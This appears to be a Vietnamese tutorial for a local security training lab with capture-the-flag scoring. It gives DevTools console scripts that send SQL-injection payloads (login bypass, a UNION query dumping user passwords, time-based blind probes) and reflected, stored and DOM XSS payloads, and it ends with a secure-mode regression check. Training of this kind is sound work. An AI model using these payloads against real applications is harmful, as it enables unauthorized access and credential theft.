# Ví Dụ Nâng Cao: JavaScript Trên DevTools Console

> Chỉ dùng trên môi trường lab được cấp quyền (ví dụ dự án này chạy tại `http://127.0.0.1:5000`).

## 1) Chuẩn bị helper gọi API

Mở DevTools (`F12`) -> tab **Console**, dán đoạn sau:

```js
const api = async (path, body, method = "POST") => {
  const options = { method, headers: { "Content-Type": "application/json" } };
  if (body !== undefined) options.body = JSON.stringify(body);
  const res = await fetch(path, options);
  return res.json();
};
```

## 2) Chuyển nhanh chế độ bảo mật

```js
await api("/api/set_security_mode", { secure: false }); // vulnerable
await api("/api/get_security_mode", undefined, "GET");
```

```js
await api("/api/set_security_mode", { secure: true }); // secure
await api("/api/get_security_mode", undefined, "GET");
```

## 3) SQLi login bypass trực tiếp từ Console

```js
await api("/api/set_security_mode", { secure: false });
await api("/api/login", {
  username: "admin' OR '1'='1",
  password: "anything"
});
```

Kỳ vọng: trả về `status: "success"` và có thể nhận cờ `FLAG-SQLI-LOGIN-001`.

## 4) UNION SQLi để đọc dữ liệu users

```js
await api("/api/set_security_mode", { secure: false });
const res = await api("/api/search_product", {
  search: "%' UNION SELECT 1, username, password, email FROM users --"
});
console.table(res.products);
res;
```

## 5) Blind SQLi time-based + đo thời gian

```js
await api("/api/set_security_mode", { secure: false });
const start = performance.now();
const out = await api("/api/blind_check", {
  probe: "admin' AND sleep(1)=0 --"
});
const elapsed = Math.round(performance.now() - start);
({ elapsedMsOnClient: elapsed, durationMsFromServer: out.duration_ms, out });
```

Kỳ vọng: thời gian tăng rõ rệt khi ở vulnerable mode.

## 6) So sánh nhanh vulnerable vs secure cho Blind SQLi

```js
const probe = "admin' AND sleep(1)=0 --";

await api("/api/set_security_mode", { secure: false });
const a1 = await api("/api/blind_check", { probe });

await api("/api/set_security_mode", { secure: true });
const a2 = await api("/api/blind_check", { probe });

({ vulnerable: a1.duration_ms, secure: a2.duration_ms, raw: { a1, a2 } });
```

## 7) Reflected XSS gọi trực tiếp

```js
await api("/api/set_security_mode", { secure: false });
await api("/api/search_reflect", {
  search: "<img src=x onerror=alert('reflected-xss')>"
});
```

## 8) Stored XSS gọi trực tiếp

```js
await api("/api/set_security_mode", { secure: false });
await api("/api/post_comment", {
  username: "hacker",
  content: "<img src=x onerror=\"alert('stored-xss')\">"
});
await api("/api/get_comments", undefined, "GET");
```

## 9) DOM XSS qua hash + claim flag

```js
await api("/api/set_security_mode", { secure: false });
const payload = "<img src=x onerror=\"alert('dom-xss')\">";
location.hash = encodeURIComponent(payload);
await api("/api/claim_dom_xss", { payload });
```

## 10) Context Encoding: xem mẫu lỗi và mẫu an toàn

```js
await api("/api/xss_context_demo", {
  value: `'><script>alert('ctx')</script>`
});
```

## 11) Mô phỏng đánh cắp token trong lab

```js
await api("/api/set_security_mode", { secure: false });
const tokenData = await api("/api/lab_token", undefined, "GET");
await api("/api/capture_token", { token: tokenData.token, source: "devtools-console" });
```

## 12) Tự động chạy batch payload và đọc log

```js
await api("/api/reset_lab_state", {});
await api("/api/set_security_mode", { secure: false });

const payloads = [
  () => api("/api/login", { username: "admin' OR '1'='1", password: "x" }),
  () => api("/api/search_product", { search: "%' UNION SELECT 1, username, password, email FROM users --" }),
  () => api("/api/blind_check", { probe: "admin' AND sleep(1)=0 --" }),
  () => api("/api/search_reflect", { search: "<img src=x onerror=alert(1)>" })
];

for (const run of payloads) {
  console.log(await run());
}

const flags = await api("/api/ctf_flags", undefined, "GET");
const events = await api("/api/security_events", undefined, "GET");
({ flags, eventsCount: events.total, firstEvents: events.events.slice(0, 5) });
```

## 13) Script kiểm tra hồi quy nhanh (an toàn phải chặn được)

```js
await api("/api/reset_lab_state", {});
await api("/api/set_security_mode", { secure: true });

const login = await api("/api/login", { username: "admin' OR '1'='1", password: "x" });
const union = await api("/api/search_product", { search: "%' UNION SELECT 1, username, password, email FROM users --" });
const blind = await api("/api/blind_check", { probe: "admin' AND sleep(1)=0 --" });
const reflect = await api("/api/search_reflect", { search: "<script>alert(1)</script>" });

({
  loginStatus: login.status,
  unionRows: union.products?.length,
  blindMs: blind.duration_ms,
  reflectedMessage: reflect.message
});
```

Kỳ vọng:
- `loginStatus` là `fail`
- `unionRows` không chứa dữ liệu bảng `users`
- `blindMs` thấp hơn đáng kể so với vulnerable mode
- `reflectedMessage` đã được escape
